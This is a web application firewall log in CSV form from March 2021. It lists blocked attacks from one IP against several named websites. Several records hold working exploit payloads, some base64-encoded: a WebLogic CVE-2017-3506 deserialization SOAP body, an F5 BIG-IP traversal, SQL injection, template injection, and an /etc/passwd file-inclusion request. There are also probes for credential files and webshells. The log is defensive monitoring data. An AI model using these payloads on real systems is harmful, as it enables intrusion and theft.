targetcity,sdate,postdata,ip,subtypeid,domain,vip,logflag,sips,targetcountry,targetprovince,city,src_port,province,platform,parameter,ruledesc,refer,eventid,starttime,wafhostname,xff,host,cookie,typeid,matchdata,newlog_time,url,type,rule,method,subtype,dst_port,actionflag,country,useragent,atdid
,2021-03-14T20:56:58,ZmlsZU5hbWU9JTJGZXRjJTJGZjUtcmVsZWFzZQ==,81.68.156.2,24013,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,40348,,anyu,-,F5 big ip any files read vuln,http://111.1.30.69:443/,1249-1615755418.298-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,24,L3RtdWkvbG9naW4uanNwLy4uOy90bXVpL2xvY2FsbGIvd29ya3NwYWNlL2ZpbGVSZWFkLmpzcA==,2021-03-14,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Other,Other_F5_001,POST,F5 Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:41,-,81.68.156.2,002,,121.32.243.71,-,,,,60144,,,-,request method not valid,-,1249-1615746821.954-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNg0KIUAjJCVeDQo=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60246,,,-,request method not valid,-,1249-1615746821.999-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNw0KYWJjZDEyMw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60874,,,-,request method not valid,-,1249-1615746822.048-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNA0KdGVzdA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:49,c2VhcmNodHlwZT01JnNlYXJjaHdvcmQ9e2lme3NlYXJjaHBhZ2U6eWVhcn0meWVhcj06ZXtzZWFyY2hwYWdlOmFyZWF9fSZhcmVhPXZ7c2VhcmNocGFnZTpsZXR0ZXJ9JmxldHRlcj1hbHtzZWFyY2hwYWdlOmxhbmd9Jnl1eWFuPShqb2lue3NlYXJjaHBhZ2U6anF9JmpxPSgkX1B7c2VhcmNocGFnZTp2ZXJ9JiZ2ZXI9T1NUWzldKSkmOVtdPXByaW4mOVtdPXRmKG1kNSgyMDk1ODY3OTMwKSk7,81.68.156.2,24001,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53174,,anyu,-,md5() function encode,http://111.1.29.159:80/,1249-1615752589.256-s3czt,0,s3.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,24,bWQ1KDIwOTU4Njc5MzApKTs=,2021-03-14,/search.php,Other,md5_encode_01,POST,Other,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T19:43:07,-,81.68.156.2,002,,121.32.243.71,-,,,,48516,,,-,request method not valid,-,1249-1615750987.653-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAwAABAAAAAAAAAAAAA=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:14,-,81.68.156.2,002,,121.32.243.71,-,,,,49462,,,-,request method not valid,-,1249-1615746732.619-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:37:48,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyIgeG1sbnM6d3NhPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1LzA4L2FkZHJlc3NpbmciIHhtbG5zOmFzeT0iaHR0cDovL3d3dy5iZWEuY29tL2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlIj48c29hcGVudjpIZWFkZXI+PHdzYTpBY3Rpb24+ZmZmPC93c2E6QWN0aW9uPjx3c2E6UmVsYXRlc1RvPmhlbGxvPC93c2E6UmVsYXRlc1RvPjx3b3JrOldvcmtDb250ZXh0IHhtbG5zOndvcms9Imh0dHA6Ly9iZWEuY29tLzIwMDQvMDYvc29hcC93b3JrYXJlYS8iPjxqYXZhPjxzdHJpbmc+PGNsYXNzPjxzdHJpbmc+b3JnLnNsZjRqLmV4dC5FdmVudERhdGE8L3N0cmluZz48dm9pZD48c3RyaW5nPjwhW0NEQVRBWzxqYXZhPjx2b2lkIGNsYXNzPSJqYXZhLmxhbmcuVGhyZWFkIiBtZXRob2Q9ImN1cnJlbnRUaHJlYWQiPjx2b2lkIG1ldGhvZD0iZ2V0Q3VycmVudFdvcmsiIGlkPSJjdXJyZW50X3dvcmsiPjx2b2lkIG1ldGhvZD0iZ2V0Q2xhc3MiPjx2b2lkIG1ldGhvZD0iZ2V0RGVjbGFyZWRGaWVsZCI+PHN0cmluZz5jb25uZWN0aW9uSGFuZGxlcjwvc3RyaW5nPjx2b2lkIG1ldGhvZD0ic2V0QWNjZXNzaWJsZSI+PGJvb2xlYW4+dHJ1ZTwvYm9vbGVhbj48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJnZXQiPjxvYmplY3QgaWRyZWY9ImN1cnJlbnRfd29yayIvPjx2b2lkIG1ldGhvZD0iZ2V0U2VydmxldFJlcXVlc3QiPjx2b2lkIG1ldGhvZD0iZ2V0UmVzcG9uc2UiPjx2b2lkIG1ldGhvZD0iZ2V0U2VydmxldE91dHB1dFN0cmVhbSI+PHZvaWQgbWV0aG9kPSJ3cml0ZSI+PGFycmF5IGNsYXNzPSJieXRlIiBsZW5ndGg9IjkiPjx2b2lkIGluZGV4PSIwIj48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEiPjxieXRlPjUwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMiI+PGJ5dGU+NTM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzIj48Ynl0ZT41NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQiPjxieXRlPjU1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNSI+PGJ5dGU+NTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Ij48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjciPjxieXRlPjU3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOCI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjwvYXJyYXk+PC92b2lkPjx2b2lkIG1ldGhvZD0iZmx1c2giLz48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJnZXRXcml0ZXIiPjx2b2lkIG1ldGhvZD0id3JpdGUiPjxzdHJpbmcvPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvamF2YT5dXT48L3N0cmluZz48L3ZvaWQ+PC9jbGFzcz48L3N0cmluZz48L2phdmE+PC93b3JrOldvcmtDb250ZXh0Pjwvc29hcGVudjpIZWFkZXI+PHNvYXBlbnY6Qm9keT48YXN5Om9uQXN5bmNEZWxpdmVyeS8+PC9zb2FwZW52OkJvZHk+PC9zb2FwZW52OkVudmVsb3BlPg==,81.68.156.2,18056,nhqzx.com,42.81.56.38,-,|DM117.149.146.17,,,,46172,,anyu,-,Weblogic CVE-2017-3506,http://117.149.146.17:443/,1249-1615750668.263-w-waf04tjgt,0,w-waf04.anyu.tjgt.360es.cn,81.68.156.2,www.nhqzx.com,-,18,-,2021-03-14,/wls-wsat/CoordinatorPortType,Common Vulnerability,Weblogic CVE-2017-3506,POST,weblogic Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:32:03,-,81.68.156.2,002,,121.32.243.71,-,,,,35160,,,-,request method not valid,-,1249-1615746723.506-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:33:01,-,81.68.156.2,002,,121.32.243.71,-,,,,39622,,,-,request method not valid,-,1249-1615746781.52-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AB4ABgEAAAEAAAAAAAAHdmVyc2lvbgRiaW5kAAAQAAM=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:17,-,81.68.156.2,002,,121.32.243.71,-,,,,49676,,,-,request method not valid,-,1249-1615746737.307-waf04fst,0,waf04.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:58,-,81.68.156.2,002,,121.32.243.71,-,,,,54734,,,-,request method not valid,-,1249-1615746778.473-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAwAABAAAAAAAAAAAAA=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:33:31,-,81.68.156.2,002,,121.32.243.71,-,,,,55534,,,-,request method not valid,-,1249-1615746811.646-waf03fst,0,waf03.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:37:21,-,81.68.156.2,18067,nhqzx.com,42.81.56.38,-,|DM117.149.146.17,,,,49348,,anyu,-,deserialize_with_Shiro_rce,-,1249-1615750641.597-w-waf03tjgt,0,w-waf03.anyu.tjgt.360es.cn,81.68.156.2,www.nhqzx.com,rememberMe=1,18,SG9zdCAgd3d3Lm5ocXp4LmNvbSAKQWNjZXB0LUVuY29kaW5nICBpZGVudGl0eSAKVXNlci1BZ2VudCAgTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDMuMDsgZW4tdXM7IFhvb20gQnVpbGQvSFJJMzkpIEFwcGxlV2ViS2l0LzUzNC4xMyAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIFNhZmFyaS81MzQuMTMgCkNvb2tpZSAgcmVtZW1iZXJNZT0x,2021-03-14,/,Common Vulnerability,Framework_shiro_005,GET,Shiro Attack,443,BLOCK,,"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",0
,2021-03-14T18:31:57,cHJvbmFtZT1tYmdmanImdHo9MSVFNCVCOCU4NyVFNCVCQiVBNSVFNCVCOCU4QiZwcm91c2U9bWJnZmpyJnN4JTVCJTVEPSZzeCU1QiU1RD0mc209bWJnZmpyJnByb3ZpbmNlPSVFNSU4NSVBOCVFNSU5QiVCRCZjaXR5PSVFNSU4NSVBOCVFNSU5QiVCRCVFNSU5MCU4NCVFNSU5QyVCMCVFNSU4QyVCQSZ4aWFuY2hlbmc9JmNpdHlmb3JhZGQ9JmltZz0lMkZpbWFnZSUyRm5vcGljLmdpZiZmbHY9JnpjPSZ5cT0mYWN0aW9uPWFkZCZTdWJtaXQ9JUU1JUExJUFCJUU1JUE1JUJEJUU0JUJBJTg2JUVGJUJDJThDJUU1JThGJTkxJUU1JUI4JTgzJUU0JUJGJUExJUU2JTgxJUFGJnNtYWxsY2xhc3NpZFtdPTEmc21hbGxjbGFzc2lkW109MiklMjB1bmlvbiUyMHNlbGVjdCUyMDQzMjQ3KjQwNjI2JTIz,81.68.156.2,01002,jiaxing.gov.cn,61.160.224.44,-,|DM111.1.29.105,,,,51760,,anyu,-,post select sql injection,-,1249-1615746717.18-s2czt,0,s2.anyu.czt.360es.cn,81.68.156.2,whgdlyj1.jiaxing.gov.cn,-,01,dW5pb24gc2VsZWN0,2021-03-14,/user/zs.php?do=save,SQL Inject,post_rule_03,POST,Post SQL Inject,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60598,,,-,request method not valid,-,1249-1615746822.038-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNQ0KJSQjQCENCg==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:54,-,81.68.156.2,13001,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53334,,anyu,-,information leak with htpasswd file,http://111.1.29.159:80/,1249-1615752594.759-s2czt,0,s2.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,13,-,2021-03-14,/.htpasswd,Information Leak Attack,information_leak_034,GET,Infomation Leak Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,58728,,,-,request method not valid,-,1249-1615746822.021-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjENCiQ0DQpwaW5nDQo=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:45,-,81.68.156.2,002,,121.32.243.71,-,,,,34040,,,-,09_method not valid,-,1249-1615746765.722-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIFJUU1AvMS4wDQoNCg==,2021-03-14,-,protocol invalidation,09_method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:17,-,81.68.156.2,002,,121.32.243.71,-,,,,58358,,,-,request method not valid,-,1249-1615746736.976-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:31:58,-,81.68.156.2,002,,121.32.243.71,-,,,,60506,,,-,request method not valid,-,1249-1615746718.862-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:10:06,-,81.68.156.2,24002,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33302,,anyu,-,sql backup file,http://111.1.29.223:80/,1249-1615752606.613-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,24,c3FsLmd6,2021-03-14,/database.sql.gz,Other,sql backup,GET,Path Disallow,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:32:57,-,81.68.156.2,002,,121.32.243.71,-,,,,55558,,,-,request method not valid,-,1249-1615746777.468-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAwAABAAAAAAAAAAAAA=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:49,-,81.68.156.2,04001,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53174,,anyu,-,lfi attack with file protocol file,http://111.1.29.159:80/,1249-1615752589.838-s3czt,0,s3.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,04,PWZpbGU6Ly8vZXRjL3Bhc3N3ZCZmaWxlRXh0PXR4dA==,2021-03-14,/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt,LFI,lfi_027,GET,Local File Inclusion Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:12,-,81.68.156.2,002,,121.32.243.71,-,,,,46836,,,-,request method not valid,-,1249-1615746792.242-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:51,-,81.68.156.2,18056,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53174,,anyu,-,deserialize_with_Oracle_WebLogic_wls9_async_01,http://111.1.29.159:80/,1249-1615752591.062-s3czt,0,s3.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,18,-,2021-03-14,/_async/AsyncResponseService,Common Vulnerability,deserialize_with_Oracle_WebLogic_wls9_async_01,POST,weblogic Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:31:21,-,81.68.156.2,003,,121.32.243.71,-,,,,37586,,,-,request header invalid,-,1249-1615746681.191-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60486,,,-,request method not valid,-,1249-1615746822.027-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokMTANCjk4NzY1NDMyMTANCg==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:55,-,81.68.156.2,16008,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33120,,anyu,-,request asp or aspx webshell file,http://111.1.29.223:80/,1249-1615752595.722-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,16,d2Vic2hlbGwuYXNw,2021-03-14,/webshell.asp,WEBSHELL,webshell_with_asp_or_aspx_common_04,GET,others webshell,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
